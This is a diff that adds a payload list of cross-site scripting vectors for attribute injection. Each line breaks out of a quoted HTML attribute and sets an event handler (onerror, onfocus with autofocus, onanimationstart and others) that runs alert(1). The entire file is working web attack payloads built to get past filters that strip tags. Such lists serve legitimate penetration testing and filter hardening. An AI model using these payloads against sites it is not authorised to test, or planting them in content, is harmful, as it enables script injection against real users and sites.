@@ -1,0 +1,13 @@
+# Event-handler attribute vectors (when attribute injection works but tags are filtered).
+" onload=alert(1) x="
+" onerror=alert(1) x="
+" onclick=alert(1) x="
+" onmouseover=alert(1) x="
+" onfocus=alert(1) autofocus x="
+" onpointerover=alert(1) x="
+" onanimationstart=alert(1) style=animation-name:spin x="
+" ontransitionend=alert(1) style=transition:all x="
+" onbeforetoggle=alert(1) x="
+" oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto x="
+' onmouseover='alert(1)
+autofocus onfocus=alert(1)
